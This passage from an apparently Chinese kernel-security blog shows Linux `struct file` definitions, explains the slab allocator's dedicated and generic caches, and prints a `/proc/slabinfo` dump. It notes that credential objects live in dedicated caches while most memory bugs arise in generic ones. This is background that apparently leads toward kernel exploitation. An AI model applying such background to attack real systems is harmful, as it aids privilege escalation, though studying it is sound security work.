__randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>open file 凭证（<code>struct file</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep_links, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>前置知识 - Slab 的两种内存缓存</strong></p>
<p>众所周知，Linux 内核主要使用 slab 分配器来进行内存分配，slab 分配器中主要维护了两种内存缓存（即可以理解成两套作用不同的内存分配方式）：</p>
<ul>
<li><code>dedicated cache</code>：这里的内存是用于分配给内核中的常用对象，在该缓存中被分配的结构体将始终保持初始化状态，以便于提高分配速度</li>
<li><code>generic cache</code>：通用缓存，大多数情况下其内存块的大小与 2 的幂次方对齐</li>
</ul>
<p>这类 <code>cred</code> 和 <code>file</code> 结构体等 <code>credential</code> 对象都是在 <code>dedicated cache</code> 中分配，而大多数内存漏洞发生的地方都是在 <code>generic cache</code> 中</p>
<p>使用 <code>sudo cat /proc/slabinfo</code> 可以查看 slab 分配器的具体信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">slabinfo - version: <span class="number">2.1</span></span><br><span class="line"><span class="meta"># name            <span class="meta-string">&lt;active_objs&gt;</span> <span class="meta-string">&lt;num_objs&gt;</span> <span class="meta-string">&lt;objsize&gt;</span> <span class="meta-string">&lt;objperslab&gt;</span> <span class="meta-string">&lt;pagesperslab&gt;</span></span></span><br><span class="line">isofs_inode_cache     <span class="number">94</span>     <span class="number">94</span>    <span class="number">688</span>   <span class="number">47</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nf_conntrack         <span class="number">400</span>    <span class="number">400</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_vdir                <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_finfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_icntnr              <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_dinfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ovl_inode             <span class="number">90</span>     <span class="number">90</span>    <span class="number">720</span>   <span class="number">45</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">AF_VSOCK             <span class="number">375</span>    <span class="number">375</span>   <span class="number">1280</span>   <span class="number">25</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_groupinfo_4k    <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsverity_info          <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fscrypt_info           <span class="number">0</span>      <span class="number">0</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCPv6                <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip6-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">184</span>   <span class="number">44</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PINGv6                 <span class="number">0</span>      <span class="number">0</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAWv6               <span class="number">1352</span>   <span class="number">1352</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UDPv6                <span class="number">360</span>    <span class="number">360</span>   <span class="number">1344</span>   <span class="number">24</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCPv6          <span class="number">0</span>      <span class="number">0</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCPv6      <span class="number">0</span>      <span class="number">0</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">TCPv6                <span class="number">130</span>    <span class="number">130</span>   <span class="number">2432</span>   <span class="number">13</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kcopyd_job             <span class="number">0</span>      <span class="number">0</span>   <span class="number">3240</span>   <span class="number">10</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dm_uevent              <span class="number">0</span>      <span class="number">0</span>   <span class="number">2888</span>   <span class="number">11</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">scsi_sense_cache    <span class="number">1504</span>   <span class="number">1504</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mqueue_inode_cache     <span class="number">34</span>     <span class="number">34</span>    <span class="number">960</span>   <span class="number">34</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">fuse_request         <span class="number">338</span>    <span class="number">338</span>    <span class="number">152</span>   <span class="number">26</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fuse_inode           <span class="number">195</span>    <span class="number">195</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ecryptfs_inode_cache      <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">ecryptfs_file_cache      <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ecryptfs_auth_tok_list_item      <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">00</span></span><br><span class="line">fat_inode_cache       <span class="number">42</span>     <span class="number">42</span>    <span class="number">776</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fat_cache              <span class="number">0</span>      <span class="number">0</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">squashfs_inode_cache    <span class="number">552</span>    <span class="number">552</span>    <span class="number">704</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">jbd2_journal_head   <span class="number">2312</span>   <span class="number">2380</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">jbd2_revoke_table_s    <span class="number">256</span>    <span class="number">256</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ext4_fc_dentry_update      <span class="number">0</span>      <span class="number">0</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">ext4_inode_cache   <span class="number">49680</span>  <span class="number">49680</span>   <span class="number">1176</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_allocation_context    <span class="number">448</span>    <span class="number">448</span>    <span class="number">144</span>   <span class="number">28</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">ext4_io_end         <span class="number">1152</span>   <span class="number">1152</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_pending_reservation   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>   <span class="number">0</span></span><br><span class="line">ext4_extent_status  <span class="number">44133</span>  <span class="number">44268</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">mbcache             <span class="number">4088</span>   <span class="number">4088</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kioctx                 <span class="number">0</span>      <span class="number">0</span>    <span class="number">576</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">userfaultfd_ctx_cache      <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dnotify_struct         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid_namespace         <span class="number">90</span>     <span class="number">90</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UNIX                <span class="number">1140</span>   <span class="number">1140</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip4-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">200</span>   <span class="number">40</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCP                  <span class="number">0</span>      <span class="number">0</span>   <span class="number">1920</span>   <span class="number">17</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_subflow      <span class="number">0</span>      <span class="number">0</span>    <span class="number">376</span>   <span class="number">43</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">xfrm_dst_cache         <span class="number">0</span>      <span class="number">0</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">xfrm_state             <span class="number">0</span>      <span class="number">0</span>    <span class="number">768</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_trie          <span class="number">935</span>    <span class="number">935</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_alias         <span class="number">876</span>    <span class="number">876</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PING                   <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAW                 <span class="number">1728</span>   <span class="number">1728</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCP          <span class="number">297</span>    <span class="number">297</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCP     <span class="number">286</span>    <span class="number">286</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">TCP                  <span class="number">224</span>    <span class="number">224</span>   <span class="number">2240</span>   <span class="number">14</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">hugetlbfs_inode_cache    <span class="number">168</span>    <span class="number">168</span>    <span class="number">664</span>   <span class="number">24</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dquot                <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ep_head             <span class="number">4096</span>   <span class="number">4096</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dax_cache             <span class="number">39</span>     <span class="number">39</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bio_crypt_ctx        <span class="number">306</span>    <span class="number">306</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_queue        <span class="number">105</span>    <span class="number">105</span>   <span class="number">2128</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec-max           <span class="number">304</span>    <span class="number">320</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-128</span>           <span class="number">256</span>    <span class="number">256</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-64</span>            <span class="number">512</span>    <span class="number">512</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">khugepaged_mm_slot    <span class="number">216</span>    <span class="number">216</span>    <span class="number">112</span>   <span class="number">36</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">user_namespace       <span class="number">156</span>    <span class="number">156</span>    <span class="number">624</span>   <span class="number">26</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dmaengine-unmap<span class="number">-256</span>     <span class="number">15</span>     <span class="number">15</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">dmaengine-unmap<span class="number">-128</span>     <span class="number">30</span>     <span class="number">30</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">sock_inode_cache    <span class="number">4212</span>   <span class="number">4212</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_ext_cache     <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_fclone_cache    <span class="number">512</span>    <span class="number">512</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">skbuff_head_cache   <span class="number">2560</span>   <span class="number">2688</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_cache      <span class="number">592</span>    <span class="number">592</span>    <span class="number">216</span>   <span class="number">37</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_ctx       <span class="number">1168</span>   <span class="number">1168</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsnotify_mark_connector   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">buffer_head       <span class="number">192504</span> <span class="number">192504</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">x86_lbr                <span class="number">0</span>      <span class="number">0</span>    <span class="number">800</span>   <span class="number">40</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">taskstats            <span class="number">736</span>    <span class="number">736</span>    <span class="number">352</span>   <span class="number">46</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_dir_entry      <span class="number">1638</span>   <span class="number">1638</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pde_opener          <span class="number">1632</span>   <span class="number">1632</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_inode_cache   <span class="number">12098</span>  <span class="number">12098</span>    <span class="number">712</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">seq_file             <span class="number">544</span>    <span class="number">544</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sigqueue            <span class="number">1071</span>   <span class="number">1071</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bdev_cache           <span class="number">160</span>    <span class="number">160</span>   <span class="number">1600</span>   <span class="number">20</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span 